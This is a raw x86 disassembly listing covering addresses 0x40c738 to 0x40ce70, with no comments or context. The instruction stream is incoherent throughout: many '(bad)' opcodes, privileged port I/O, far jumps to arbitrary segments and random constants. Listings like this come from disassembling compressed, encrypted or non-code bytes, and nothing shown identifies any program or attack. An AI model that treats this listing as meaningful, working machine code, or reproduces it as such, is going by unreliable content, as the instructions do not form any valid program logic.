  40c738:	sbb    bh,bl
  40c73a:	adc    eax,0xa293552
  40c73f:	in     al,0x82
  40c741:	jp     0x40c6d2
  40c743:	dec    esp
  40c744:	mov    dh,bl
  40c746:	mov    ebp,0x18e470e4
  40c74b:	jmp    0x40c709
  40c74d:	push   ebp
  40c74e:	nop
  40c74f:	outs   dx,DWORD PTR ds:[esi]
  40c750:	inc    ebx
  40c751:	jg     0x40c730
  40c753:	dec    esp
  40c754:	(bad)  
  40c755:	mov    esp,0x388c269b
  40c75a:	mov    dh,0x12
  40c75c:	icebp  
  40c75d:	pusha  
  40c75e:	and    dl,bh
  40c760:	aam    0x59
  40c762:	out    dx,eax
  40c763:	jp     0x40c73d
  40c765:	cmp    al,0x4d
  40c767:	jns    0x40c712
  40c769:	jmp    0x40c78d
  40c76b:	push   0x33de43ad
  40c770:	sbb    al,0xf5
  40c772:	push   esp
  40c773:	into   
  40c774:	pop    edx
  40c775:	test   ebx,ebx
  40c777:	cmp    eax,0xa7f7cc11
  40c77c:	push   esi
  40c77d:	mov    bl,0x1d
  40c77f:	nop
  40c780:	cmp    cl,BYTE PTR [eax-0x19]
  40c783:	cmp    edi,DWORD PTR [ebx+0x61]
  40c786:	pop    ss
  40c787:	es in  eax,dx
  40c789:	(bad)  
  40c78b:	mov    dl,0x5a
  40c78d:	push   0x8aecf99f
  40c792:	retf   0x3b83
  40c795:	std    
  40c796:	inc    esp
  40c797:	dec    edi
  40c798:	das    
  40c799:	mov    ds:0x2c4dc875,al
  40c79e:	aas    
  40c79f:	pushf  
  40c7a0:	out    dx,al
  40c7a1:	mov    ds:0x2b93953d,eax
  40c7a6:	test   ah,ch
  40c7a8:	sub    eax,0xb723675b
  40c7ad:	rcr    DWORD PTR [eax+0x1912ab2a],cl
  40c7b3:	cmp    BYTE PTR [esi+0x1f],ch
  40c7b6:	dec    esp
  40c7b7:	ins    BYTE PTR es:[edi],dx
  40c7b8:	out    dx,al
  40c7b9:	bound  esi,QWORD PTR [edx]
  40c7bb:	pop    es
  40c7bc:	ret    
  40c7bd:	sbb    al,0xbd
  40c7bf:	out    0x31,al
  40c7c1:	faddp  st(6),st
  40c7c3:	in     eax,0xb2
  40c7c5:	lock ja 0x40c77b
  40c7c8:	mov    ds:0xaaba4492,eax
  40c7cd:	push   eax
  40c7ce:	push   ebp
  40c7cf:	ss add edx,ebx
  40c7d2:	cmp    esp,DWORD PTR [eax+0x2fdc644]
  40c7d8:	popa   
  40c7d9:	jp     0x40c82b
  40c7db:	and    eax,0xa5084c58
  40c7e0:	(bad)  
  40c7e2:	ja     0x40c79d
  40c7e4:	push   ecx
  40c7e5:	push   0x2dd72d09
  40c7ea:	xchg   ebx,eax
  40c7eb:	mov    ecx,0xfad48ad2
  40c7f0:	mov    ebx,0x5562c241
  40c7f5:	push   ds
  40c7f6:	jno    0x40c842
  40c7f8:	loopne 0x40c7de
  40c7fa:	pop    edx
  40c7fb:	dec    esi
  40c7fc:	xor    DWORD PTR [ebp-0x2710bff],edi
  40c802:	add    esp,esp
  40c804:	xchg   esi,eax
  40c805:	push   0xffffff9a
  40c807:	pop    ds
  40c808:	scas   al,BYTE PTR es:[edi]
  40c809:	(bad)  
  40c80b:	cmp    BYTE PTR [ebx-0x117da6ed],ch
  40c811:	mov    ah,0xa0
  40c813:	adc    ebp,DWORD PTR [ebp+0x5005ed81]
  40c819:	or     BYTE PTR [esi+ebp*1],ah
  40c81c:	ds cs add eax,0xee127603
  40c823:	into   
  40c824:	sbb    dh,dh
  40c826:	xlat   BYTE PTR ds:[ebx]
  40c827:	jmp    FWORD PTR [esi-0x6d]
  40c82a:	push   esp
  40c82b:	lods   eax,DWORD PTR ds:[esi]
  40c82c:	add    ebx,DWORD PTR [edx]
  40c82e:	dec    edx
  40c82f:	lock (bad) 
  40c831:	jg     0x40c814
  40c833:	(bad)  
  40c834:	pop    esp
  40c835:	div    eax
  40c837:	repnz inc esp
  40c839:	mov    DWORD PTR [ebx+ebx*1],ebp
  40c83c:	scas   al,BYTE PTR es:[edi]
  40c83d:	leave  
  40c83e:	dec    eax
  40c83f:	cld    
  40c840:	fstp   TBYTE PTR [edx*4+0x4deaba82]
  40c847:	jbe    0x40c863
  40c849:	sub    DWORD PTR [eax+eax*1+0x26],ebp
  40c84d:	fidiv  WORD PTR [eax]
  40c84f:	mov    ch,ch
  40c851:	inc    ecx
  40c852:	xchg   ebp,eax
  40c853:	out    dx,al
  40c854:	data16 in al,0xf1
  40c857:	pop    bp
  40c859:	add    ebp,DWORD PTR [ebx+0x27]
  40c85c:	shl    ch,0x75
  40c85f:	mov    esi,0xac5e883c
  40c864:	add    al,0x34
  40c866:	dec    esi
  40c867:	mov    ebx,ecx
  40c869:	in     al,dx
  40c86a:	gs int3 
  40c86c:	mov    bl,0x57
  40c86e:	mov    di,0xb4c6
  40c872:	push   ebx
  40c873:	sub    al,0x80
  40c875:	and    eax,0x7e9f0acf
  40c87a:	xchg   BYTE PTR [ebp+0x6b],dh
  40c87d:	cwde   
  40c87e:	adc    ah,BYTE PTR [ecx+0x5f]
  40c881:	mov    bh,0xa8
  40c883:	fld    st(6)
  40c885:	les    ebp,FWORD PTR gs:[edi+0x7090464]
  40c88c:	jmp    0x40c8f0
  40c88e:	leave  
  40c88f:	ret    0x2e98
  40c892:	pop    ss
  40c893:	jmp    0x7795:0x5448643e
  40c89a:	pop    ebx
  40c89b:	adc    al,0xaf
  40c89d:	aam    0xf7
  40c89f:	fisubr DWORD PTR [esi-0x61]
  40c8a2:	adc    bh,dh
  40c8a4:	mov    ebx,0x2c967cae
  40c8a9:	add    bh,bh
  40c8ab:	xchg   bh,al
  40c8ad:	ret    
  40c8ae:	jne    0x40c922
  40c8b0:	daa    
  40c8b1:	pop    esi
  40c8b2:	stos   BYTE PTR es:[edi],al
  40c8b3:	stc    
  40c8b4:	sbb    esp,0xffffffd0
  40c8b7:	cmc    
  40c8b8:	cmp    al,0xf9
  40c8ba:	mov    al,ds:0x50bf58c4
  40c8bf:	out    dx,al
  40c8c0:	call   0x75a29779
  40c8c5:	or     cl,al
  40c8c7:	es gs mov cl,0x39
  40c8cb:	rcl    BYTE PTR [esi-0x12a42451],1
  40c8d1:	jns    0x40c8cc
  40c8d3:	xor    eax,0xf7ee2fa8
  40c8d8:	pushf  
  40c8d9:	sub    al,BYTE PTR ds:0x47592d39
  40c8df:	push   esi
  40c8e0:	xor    BYTE PTR [ebp+0x78d2a9b5],ch
  40c8e6:	mov    ebx,0xb2f0b233
  40c8eb:	push   edi
  40c8ec:	jmp    0xd6a83265
  40c8f1:	push   edx
  40c8f2:	jp     0x40c948
  40c8f4:	sbb    al,0xe9
  40c8f6:	sar    DWORD PTR [edx],cl
  40c8f8:	pusha  
  40c8f9:	push   ebx
  40c8fa:	ja     0x40c93b
  40c8fc:	repz mov al,ds:0xd4d8619b
  40c902:	bound  ebx,QWORD PTR [ebx]
  40c904:	mov    ebx,0x427260ba
  40c909:	rcl    DWORD PTR [eax-0x6c],cl
  40c90c:	cmp    al,0x4e
  40c90e:	mov    ds:0x635540dc,eax
  40c913:	in     eax,dx
  40c914:	and    DWORD PTR [esi],ecx
  40c916:	cmp    ecx,DWORD PTR [ecx+0x2d]
  40c919:	(bad)  
  40c91b:	out    0x6d,al
  40c91d:	repnz lods al,BYTE PTR ds:[esi]
  40c91f:	daa    
  40c920:	pop    ebp
  40c921:	loop   0x40c8e0
  40c923:	sbb    DWORD PTR [esi-0x12],ebp
  40c926:	push   ebx
  40c927:	fcomp  DWORD PTR [edi]
  40c929:	mov    al,BYTE PTR [esi-0x27c68000]
  40c92f:	and    ah,BYTE PTR [edx-0x65]
  40c932:	mov    dl,0x42
  40c934:	into   
  40c935:	sbb    al,0x73
  40c937:	and    al,0xe1
  40c939:	jnp    0x40c968
  40c93b:	inc    ecx
  40c93c:	xchg   ebx,eax
  40c93d:	adc    ch,dl
  40c93f:	or     DWORD PTR [edi],edx
  40c941:	sub    eax,0xf6989ed
  40c946:	les    ebp,FWORD PTR ds:0x3d6543bc
  40c94c:	push   edx
  40c94d:	inc    eax
  40c94e:	adc    ah,BYTE PTR [ebp-0x17]
  40c951:	xadd   DWORD PTR [eax+0x51],esp
  40c955:	xchg   edx,eax
  40c956:	lods   eax,DWORD PTR ds:[esi]
  40c957:	bnd je 0x40c95c
  40c95a:	test   DWORD PTR ds:0x9f771dcc,ebp
  40c960:	push   ecx
  40c961:	mov    al,ds:0xe0fb0381
  40c966:	mul    BYTE PTR [edx-0x72]
  40c969:	das    
  40c96a:	push   edx
  40c96b:	fistp  QWORD PTR [esi+0x4a]
  40c96e:	jae    0x40c91c
  40c970:	sbb    al,0x43
  40c972:	lea    esp,[edi-0x5570571f]
  40c978:	lahf   
  40c979:	hlt    
  40c97a:	nop
  40c97b:	aas    
  40c97c:	sar    BYTE PTR [ebx+0x27],0xd1
  40c980:	sub    ch,BYTE PTR [esi+0x60e5ce72]
  40c986:	cmc    
  40c987:	scas   al,BYTE PTR es:[edi]
  40c988:	dec    ebp
  40c989:	loope  0x40c945
  40c98b:	dec    ecx
  40c98c:	dec    ebp
  40c98d:	test   al,0x6
  40c98f:	cmp    BYTE PTR [edx],ch
  40c991:	(bad)  
  40c992:	inc    BYTE PTR ds:0x2791db9d
  40c998:	pop    es
  40c999:	inc    ebp
  40c99a:	pop    esp
  40c99b:	data16 cmp BYTE PTR [eax+0x67],bl
  40c99f:	or     DWORD PTR [edx],ebp
  40c9a1:	jmp    0x40c9b5
  40c9a3:	or     ecx,esi
  40c9a5:	sahf   
  40c9a6:	imul   esp,DWORD PTR [edi+0x2e],0x6d78c332
  40c9ad:	ds daa 
  40c9af:	cld    
  40c9b0:	stc    
  40c9b1:	jle    0x40c959
  40c9b3:	shl    BYTE PTR [ebx-0x6f9a4e1b],0x38
  40c9ba:	call   0xeafd:0x89afdef8
  40c9c1:	cmp    ebx,esp
  40c9c3:	leave  
  40c9c4:	ror    BYTE PTR [edi+0x6a68f2e0],0x50
  40c9cb:	jmp    0xcf8e:0x14f17090
  40c9d2:	out    0x83,eax
  40c9d4:	in     al,0x4a
  40c9d6:	add    al,bh
  40c9d8:	daa    
  40c9d9:	loope  0x40ca0f
  40c9db:	popf   
  40c9dc:	sub    eax,0x15581f69
  40c9e1:	js     0x40ca49
  40c9e3:	push   esi
  40c9e4:	pushf  
  40c9e5:	ja     0x40ca16
  40c9e7:	jp     0x40ca3a
  40c9e9:	dec    BYTE PTR [ebx+0x12]
  40c9ec:	iret   
  40c9ed:	ss add al,0x1a
  40c9f0:	sbb    BYTE PTR [esi+0x15fb4aff],0xa6
  40c9f7:	in     al,0xca
  40c9f9:	(bad)  
  40c9fa:	gs rcl ebx,cl
  40c9fd:	and    BYTE PTR [esp+ebp*8],cl
  40ca00:	xor    al,0x87
  40ca03:	call   0x4f0f:0x985192f8
  40ca0a:	les    edx,FWORD PTR [eax-0x47a0df28]
  40ca10:	test   DWORD PTR [ebx+0x5f],ebp
  40ca13:	pop    edi
  40ca14:	jecxz  0x40ca63
  40ca16:	mov    esp,0xbbf3bd6e
  40ca1b:	dec    esi
  40ca1c:	stos   DWORD PTR es:[edi],eax
  40ca1d:	sub    ecx,DWORD PTR [ebx-0x6239ebb7]
  40ca23:	or     ah,ch
  40ca25:	push   eax
  40ca26:	(bad)  
  40ca27:	and    al,0x35
  40ca29:	add    edi,DWORD PTR [edx]
  40ca2b:	(bad)  
  40ca2c:	push   edx
  40ca2d:	test   BYTE PTR [eax],ch
  40ca2f:	dec    esp
  40ca30:	fcmovbe st,st(5)
  40ca32:	xchg   edi,eax
  40ca33:	jnp    0x40ca77
  40ca35:	sub    BYTE PTR [ecx],ah
  40ca37:	or     eax,0xc5416ab
  40ca3c:	cmp    ah,dl
  40ca3e:	test   eax,0x8fd15d53
  40ca43:	push   cs
  40ca44:	mov    DWORD PTR [ebp+edi*4-0x2c4e0b18],eax
  40ca4b:	je     0x40ca8f
  40ca4d:	cli    
  40ca4e:	inc    ebx
  40ca4f:	push   eax
  40ca50:	ins    BYTE PTR es:[edi],dx
  40ca51:	fdiv   st(0),st
  40ca53:	popa   
  40ca54:	pop    ss
  40ca55:	sar    ebx,cl
  40ca57:	icebp  
  40ca58:	and    al,BYTE PTR [edi+0x18]
  40ca5b:	outs   dx,DWORD PTR ds:[esi]
  40ca5c:	sub    edx,esi
  40ca5e:	(bad)  
  40ca5f:	das    
  40ca60:	lods   al,BYTE PTR ds:[esi]
  40ca61:	imul   eax,DWORD PTR [edi-0x79cf60fe],0x346ea237
  40ca6b:	xchg   edx,eax
  40ca6c:	(bad)  
  40ca6d:	xor    bh,BYTE PTR [ebp+0x36]
  40ca70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca71:	mov    ds:0xad3bf208,eax
  40ca76:	dec    ecx
  40ca77:	dec    ebp
  40ca78:	jnp    0x40caea
  40ca7a:	loopne 0x40ca61
  40ca7c:	je     0x40caca
  40ca7e:	in     al,0xa
  40ca80:	dec    ecx
  40ca81:	test   eax,0x7d403cc6
  40ca86:	sbb    al,0x58
  40ca88:	enter  0xa877,0xf6
  40ca8c:	dec    ebp
  40ca8d:	cli    
  40ca8e:	pop    esp
  40ca8f:	repz into 
  40ca91:	mov    edi,0x4f000a93
  40ca96:	fidiv  WORD PTR [ebp+0x64151eb2]
  40ca9c:	jge    0x40cb10
  40ca9e:	ins    DWORD PTR es:[edi],dx
  40ca9f:	add    BYTE PTR [edi+0x21],0xc8
  40caa3:	push   ss
  40caa4:	xor    eax,0x86456be4
  40caa9:	pop    ecx
  40caaa:	xor    eax,esi
  40caac:	fld    st(2)
  40caae:	cdq    
  40caaf:	js     0x40cb13
  40cab1:	sbb    BYTE PTR [esi-0x6],0xcf
  40cab5:	pop    ds
  40cab6:	jg     0x40cad8
  40cab8:	test   BYTE PTR [ecx+0x66],dh
  40cabb:	push   ebp
  40cabc:	xchg   ebp,eax
  40cabd:	fucomp st(4)
  40cabf:	xor    al,0xfb
  40cac1:	dec    ebx
  40cac2:	cmp    eax,0x2339da43
  40cac7:	scas   al,BYTE PTR es:[edi]
  40cac8:	mov    ?,WORD PTR [edx+0x2]
  40cacb:	ins    DWORD PTR es:[edi],dx
  40cacc:	stos   BYTE PTR es:[edi],al
  40cacd:	dec    eax
  40cace:	pop    es
  40cacf:	cmp    ah,BYTE PTR [edx+0x4f]
  40cad2:	sbb    ah,BYTE PTR [ecx+0x7c]
  40cad5:	cmp    eax,0xa6a9099c
  40cada:	mov    DWORD PTR [edi+0x6c4ba34f],edi
  40cae0:	pop    ebx
  40cae1:	fadd   DWORD PTR [ecx+0x1f]
  40cae4:	xlat   BYTE PTR ds:[ebx]
  40cae5:	nop
  40cae6:	sbb    dl,ah
  40cae8:	dec    eax
  40cae9:	rcr    BYTE PTR [ebx-0x5c7b9ddb],cl
  40caef:	mov    eax,0x5f2d1c02
  40caf4:	jmp    0x40ca83
  40caf6:	or     cl,dl
  40caf8:	ror    dl,cl
  40cafa:	sub    edx,DWORD PTR [edi+0x61]
  40cafd:	dec    eax
  40cafe:	lods   eax,DWORD PTR ds:[esi]
  40caff:	repz jo 0x40cad4
  40cb02:	sahf   
  40cb03:	jns    0x40cad9
  40cb05:	scas   eax,DWORD PTR es:[edi]
  40cb06:	out    dx,eax
  40cb07:	shl    DWORD PTR [ebx-0x5c6a6708],cl
  40cb0d:	stos   DWORD PTR es:[edi],eax
  40cb0e:	sbb    eax,0xd60deb51
  40cb13:	jnp    0x40cb30
  40cb15:	cld    
  40cb16:	cmp    BYTE PTR [ecx],dl
  40cb18:	pop    edx
  40cb19:	aad    0xdc
  40cb1b:	mov    ah,0x23
  40cb1d:	push   es
  40cb1e:	in     al,0x81
  40cb20:	pop    ebx
  40cb21:	mov    bl,0xf1
  40cb23:	sbb    cl,BYTE PTR [edx+0x78]
  40cb26:	int3   
  40cb27:	xor    BYTE PTR [eax],0xc8
  40cb2a:	mov    edi,0x4231c489
  40cb2f:	and    DWORD PTR [ecx-0x2c015d5],edi
  40cb35:	std    
  40cb36:	xor    eax,0x8a5a801e
  40cb3b:	in     eax,dx
  40cb3c:	ret    
  40cb3d:	or     cl,BYTE PTR [ecx+0x52]
  40cb40:	rol    BYTE PTR [edx-0x73],1
  40cb43:	add    eax,DWORD PTR fs:[edi-0x6a3b1a80]
  40cb4a:	fcmovu st,st(3)
  40cb4c:	rol    ch,1
  40cb4e:	xchg   edx,eax
  40cb4f:	arpl   ax,di
  40cb51:	repnz sbb ecx,DWORD PTR [eax]
  40cb54:	jb     0x40cbbe
  40cb56:	sbb    bl,al
  40cb58:	mov    ecx,0xd2e66f0a
  40cb5d:	xchg   ebp,eax
  40cb5e:	shr    BYTE PTR [edx],0x3c
  40cb61:	push   ebp
  40cb62:	(bad)  
  40cb63:	call   0x473bfdcb
  40cb68:	or     eax,0xee1bd77f
  40cb6d:	push   es
  40cb6e:	pop    esp
  40cb6f:	jg     0x40cb1b
  40cb71:	stos   BYTE PTR es:[edi],al
  40cb72:	pop    ebx
  40cb73:	loope  0x40cb36
  40cb75:	rcr    BYTE PTR [esp+eax*4],1
  40cb78:	mov    ch,0x17
  40cb7a:	pop    esi
  40cb7b:	pushf  
  40cb7c:	cwde   
  40cb7d:	xor    BYTE PTR [esp+edx*2+0x7e24bae4],ch
  40cb84:	outs   dx,DWORD PTR ds:[esi]
  40cb85:	lea    esp,[esi+0x37e86495]
  40cb8b:	fmul   QWORD PTR [edi-0x6d0da9a8]
  40cb91:	call   0xdccf59d8
  40cb96:	jmp    0x4ab0c69f
  40cb9b:	out    dx,eax
  40cb9c:	mov    ebx,0x7f83592
  40cba1:	push   ebx
  40cba2:	xor    bh,BYTE PTR [edx-0x723fd8ff]
  40cba8:	xor    dl,BYTE PTR [ecx]
  40cbaa:	icebp  
  40cbab:	(bad)  
  40cbac:	and    al,0xe6
  40cbae:	pop    eax
  40cbaf:	add    al,0x27
  40cbb1:	and    DWORD PTR [esi],ebx
  40cbb3:	push   cs
  40cbb4:	lods   eax,DWORD PTR ds:[esi]
  40cbb5:	int    0xe2
  40cbb7:	sahf   
  40cbb8:	ret    0xc00c
  40cbbb:	(bad)  
  40cbbc:	pop    esi
  40cbbd:	loop   0x40cbf3
  40cbbf:	call   0x983:0x2a02bdad
  40cbc6:	enter  0x5f23,0x87
  40cbca:	xchg   BYTE PTR [ecx],bh
  40cbcc:	pusha  
  40cbcd:	xlat   BYTE PTR ds:[ebx]
  40cbce:	lods   eax,DWORD PTR ds:[esi]
  40cbcf:	pop    ebp
  40cbd0:	adc    al,0x8c
  40cbd2:	fwait
  40cbd3:	pop    ebp
  40cbd4:	push   edi
  40cbd5:	jne    0x40cb75
  40cbd7:	xchg   esi,eax
  40cbd8:	pop    edi
  40cbd9:	inc    ebp
  40cbda:	inc    edi
  40cbdb:	jle    0x40cb60
  40cbdd:	jns    0x40cc0f
  40cbdf:	ret    0x5124
  40cbe2:	enter  0xfc4c,0xf8
  40cbe6:	jge    0x40cc39
  40cbe8:	mov    ecx,0xd5be678e
  40cbed:	adc    dh,dl
  40cbef:	dec    esi
  40cbf0:	mov    es,WORD PTR [ecx-0x20a3a708]
  40cbf6:	add    eax,0xfeee69ed
  40cbfb:	adc    esi,ecx
  40cbfd:	pop    es
  40cbfe:	mov    ecx,0xcc9e859
  40cc03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc04:	pop    esi
  40cc05:	cs test bh,ch
  40cc08:	jne    0x40cb96
  40cc0a:	out    0xdd,eax
  40cc0c:	imul   ebp,DWORD PTR [edx],0xe778ef84
  40cc12:	inc    eax
  40cc13:	or     esi,ebp
  40cc15:	ret    0x31ad
  40cc18:	scas   al,BYTE PTR es:[edi]
  40cc19:	sub    bh,BYTE PTR [edi+0x5dbb79f2]
  40cc1f:	mov    ebp,0x7b74fec7
  40cc24:	retf   
  40cc25:	das    
  40cc26:	inc    edi
  40cc27:	xchg   ecx,eax
  40cc28:	mov    ah,0x16
  40cc2a:	es push esi
  40cc2c:	(bad)  
  40cc2d:	dec    esp
  40cc2e:	retf   0xe15d
  40cc31:	pop    ecx
  40cc32:	push   ds
  40cc33:	cmp    eax,0x4ea6e963
  40cc38:	inc    ebp
  40cc39:	lock xchg ebp,eax
  40cc3b:	out    0xd8,al
  40cc3d:	ins    BYTE PTR es:[edi],dx
  40cc3e:	hlt    
  40cc3f:	add    al,0x70
  40cc41:	or     esi,edx
  40cc43:	pusha  
  40cc44:	into   
  40cc45:	xchg   esp,eax
  40cc46:	dec    esi
  40cc47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc48:	jmp    0x8764:0x2fe18de1
  40cc4f:	sbb    ecx,DWORD PTR [ebp+0x1d]
  40cc52:	mov    dh,dl
  40cc54:	les    ecx,FWORD PTR [ebx+0xc2150e7]
  40cc5a:	retf   
  40cc5b:	cmc    
  40cc5c:	inc    ebx
  40cc5d:	dec    eax
  40cc5e:	retf   0x7a72
  40cc61:	push   ebx
  40cc62:	bound  edx,QWORD PTR [edx+0x4d]
  40cc65:	lea    ebx,[edi+0xe]
  40cc68:	cmp    dh,bl
  40cc6a:	in     eax,0xa9
  40cc6c:	retf   
  40cc6d:	mov    esi,0x84d233ab
  40cc72:	push   ecx
  40cc73:	fsin   
  40cc75:	outs   dx,DWORD PTR ds:[esi]
  40cc76:	or     DWORD PTR ds:0x529b91ca,esp
  40cc7c:	add    bh,dh
  40cc7e:	shl    BYTE PTR [eax],0xb7
  40cc81:	pop    ds
  40cc82:	sub    BYTE PTR [ebx-0xe],cl
  40cc85:	xor    eax,0x8b8ce774
  40cc8a:	inc    edi
  40cc8b:	outs   dx,DWORD PTR ds:[esi]
  40cc8c:	js     0x40cca4
  40cc8e:	ret    
  40cc8f:	add    BYTE PTR [edx+eiz*1-0x117ade94],0x7f
  40cc97:	into   
  40cc98:	xor    BYTE PTR [ecx+edx*8-0x3f0bc4c6],dl
  40cc9f:	cld    
  40cca0:	add    ah,BYTE PTR [esi]
  40cca2:	xchg   bl,ah
  40cca4:	outs   dx,BYTE PTR ds:[esi]
  40cca5:	(bad)  
  40cca6:	call   0xf3dcfc3f
  40ccab:	fcomip st,st(3)
  40ccad:	in     eax,0x17
  40ccaf:	cld    
  40ccb0:	add    cl,BYTE PTR [ecx-0x20d49fe6]
  40ccb6:	mov    DWORD PTR [eax+0x2090f27a],edi
  40ccbc:	(bad)  
  40ccbd:	push   ecx
  40ccbe:	leave  
  40ccbf:	ret    
  40ccc0:	les    esi,FWORD PTR [ecx-0x48]
  40ccc3:	xchg   ax,ax
  40ccc5:	xchg   DWORD PTR [eax-0x64],ebx
  40ccc8:	sbb    BYTE PTR [edi-0xc],dl
  40cccb:	mov    bl,0xdc
  40cccd:	jo     0x40cd39
  40cccf:	mul    ecx
  40ccd1:	xor    al,0xbe
  40ccd3:	mov    esi,0x4dc176d1
  40ccd8:	sbb    bh,BYTE PTR [edx+0x5b06fa97]
  40ccde:	adc    DWORD PTR [ebx],edx
  40cce0:	inc    edx
  40cce1:	shl    DWORD PTR [edi],0x13
  40cce4:	fs xchg edi,eax
  40cce6:	in     eax,0x95
  40cce8:	inc    ecx
  40cce9:	mov    dl,0xcc
  40cceb:	jnp    0x40ccc7
  40cced:	repz jae 0x40ccdd
  40ccf0:	rcl    ah,0x3a
  40ccf3:	inc    esi
  40ccf4:	push   ebp
  40ccf5:	xchg   BYTE PTR [edi-0x9],al
  40ccf8:	call   0x972c480e
  40ccfd:	aad    0x4b
  40ccff:	pushf  
  40cd00:	pop    esi
  40cd01:	adc    DWORD PTR [ebx],esp
  40cd03:	mov    dh,0xc8
  40cd05:	sbb    al,0xec
  40cd07:	outs   dx,BYTE PTR ds:[esi]
  40cd08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd09:	sub    al,0x35
  40cd0b:	push   es
  40cd0c:	sbb    WORD PTR [ecx+0x24],ax
  40cd10:	jg     0x40cd1b
  40cd12:	dec    eax
  40cd13:	mov    cl,0x20
  40cd15:	mov    eax,ds:0x8c7f2d0b
  40cd1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd1b:	mov    al,BYTE PTR [ebx-0x5b]
  40cd1e:	push   0xe869cd09
  40cd23:	mov    eax,ds:0x7fbacf1
  40cd28:	xor    ch,BYTE PTR [edx+0x4e18394]
  40cd2e:	stos   BYTE PTR es:[edi],al
  40cd2f:	adc    BYTE PTR [esp+esi*2-0x17],bl
  40cd33:	sbb    al,0xaf
  40cd35:	ins    DWORD PTR es:[edi],dx
  40cd36:	dec    edi
  40cd37:	rcr    DWORD PTR ss:[esi+0x73],cl
  40cd3b:	je     0x40cce0
  40cd3d:	clc    
  40cd3e:	pop    ds
  40cd3f:	mov    esi,0xa5c25136
  40cd44:	push   ss
  40cd45:	push   esi
  40cd46:	jg     0x40cd32
  40cd48:	xchg   ebp,eax
  40cd49:	mov    edi,0x3be39d47
  40cd4e:	push   edi
  40cd4f:	mov    bl,0xb2
  40cd51:	inc    esi
  40cd52:	jns    0x40cd15
  40cd54:	js     0x40cd51
  40cd56:	iret   
  40cd57:	btr    esp,ebp
  40cd5a:	mov    ds:0xb5cd1909,al
  40cd5f:	adc    esp,DWORD PTR [eax]
  40cd61:	sbb    ah,cl
  40cd63:	scas   al,BYTE PTR es:[edi]
  40cd64:	jl     0x40cde2
  40cd66:	icebp  
  40cd67:	add    eax,0xaf0ed8f9
  40cd6c:	mov    WORD PTR [edi*2+0x29d9354d],?
  40cd73:	jecxz  0x40cd1a
  40cd75:	retf   0xf49e
  40cd78:	push   ebx
  40cd79:	lahf   
  40cd7a:	cli    
  40cd7b:	nop
  40cd7c:	push   edi
  40cd7d:	sub    bh,cl
  40cd7f:	pop    edx
  40cd80:	xchg   edi,eax
  40cd81:	cs xchg ebp,eax
  40cd83:	and    eax,0x73cfef9e
  40cd88:	mov    ecx,0x1db4d3d7
  40cd8d:	lods   al,BYTE PTR ds:[esi]
  40cd8e:	cmp    al,0x5f
  40cd90:	mov    cl,0xf0
  40cd92:	aad    0x3e
  40cd94:	ret    0x89be
  40cd97:	push   ss
  40cd98:	out    dx,al
  40cd99:	in     al,dx
  40cd9a:	aad    0xd1
  40cd9c:	icebp  
  40cd9d:	test   BYTE PTR [edi+ebp*4-0x64],0xf5
  40cda2:	ins    BYTE PTR es:[edi],dx
  40cda3:	push   ecx
  40cda4:	pop    DWORD PTR [ecx+eiz*8+0x27d35649]
  40cdab:	loope  0x40cdc6
  40cdad:	dec    esi
  40cdae:	shl    DWORD PTR [edx],1
  40cdb0:	stos   DWORD PTR es:[edi],eax
  40cdb1:	cmp    ah,BYTE PTR [edi+0x3d358176]
  40cdb7:	int3   
  40cdb8:	stc    
  40cdb9:	cmp    DWORD PTR [ebp-0x50ce47bd],eax
  40cdbf:	mov    ss,ebp
  40cdc1:	test   eax,0xb4fb8489
  40cdc6:	icebp  
  40cdc7:	push   esp
  40cdc8:	pop    ecx
  40cdc9:	jns    0x40cda9
  40cdcb:	mov    dl,0xb0
  40cdcd:	xor    ebx,edx
  40cdcf:	dec    ebx
  40cdd0:	pushf  
  40cdd1:	pop    ebp
  40cdd2:	stc    
  40cdd3:	xchg   ecx,eax
  40cdd4:	(bad)  
  40cdd5:	sub    DWORD PTR cs:[esi+0x4d579b3a],ebx
  40cddc:	aam    0x38
  40cdde:	loopne 0x40cdf6
  40cde0:	ins    BYTE PTR es:[edi],dx
  40cde1:	lock push ebp
  40cde3:	(bad)  
  40cde4:	mov    cl,0xe3
  40cde6:	shr    DWORD PTR [ebp-0x5],cl
  40cde9:	js     0x40ce03
  40cdeb:	das    
  40cdec:	sub    DWORD PTR [ebp-0x65],0x1ffe0c91
  40cdf3:	add    al,0x79
  40cdf5:	stc    
  40cdf6:	(bad)  
  40cdf7:	mov    ecx,0xbea701ab
  40cdfc:	call   0x66af:0x5bea7769
  40ce03:	mov    ah,BYTE PTR ds:0x3e041ac2
  40ce09:	cmp    DWORD PTR [edx-0x79],ebp
  40ce0c:	inc    ebx
  40ce0d:	xchg   BYTE PTR [edx-0x9],ch
  40ce10:	rcl    DWORD PTR [ecx-0x2c],cl
  40ce13:	dec    eax
  40ce14:	popa   
  40ce15:	jae    0x40cdb6
  40ce17:	adc    eax,0xf7c4cc71
  40ce1c:	xchg   ebx,eax
  40ce1d:	push   0x8
  40ce1f:	jne    0x40ce4d
  40ce21:	fidivr DWORD PTR [ebx]
  40ce23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce24:	icebp  
  40ce25:	adc    al,0x76
  40ce28:	pop    ss
  40ce29:	mov    ecx,0xb6dcd164
  40ce2e:	rcl    DWORD PTR [eax],cl
  40ce30:	xchg   esi,eax
  40ce31:	cmp    ah,BYTE PTR [eax+0x51bd9669]
  40ce37:	inc    ebx
  40ce38:	icebp  
  40ce39:	(bad)  
  40ce3a:	mov    bl,0x2f
  40ce3c:	test   BYTE PTR [eax],0x5a
  40ce3f:	add    BYTE PTR ds:0x71e1468c,ch
  40ce45:	mov    ebx,0x359cc1e3
  40ce4a:	ins    DWORD PTR es:[edi],dx
  40ce4b:	push   eax
  40ce4c:	sbb    esi,esp
  40ce4e:	clc    
  40ce4f:	mov    esi,DWORD PTR [edx+0x4dd807ae]
  40ce55:	in     al,0x1d
  40ce57:	jmp    0xacff77b3
  40ce5c:	jp     0x40ce7c
  40ce5e:	js     0x40ce33
  40ce60:	fmul   DWORD PTR ds:0xfdae1f05
  40ce66:	repnz ins BYTE PTR es:[edi],dx
  40ce68:	les    eax,FWORD PTR [ecx-0x1a]
  40ce6b:	adc    al,0xd8
  40ce6d:	cmp    bl,0x1f
  40ce70:	sub    al,0x41
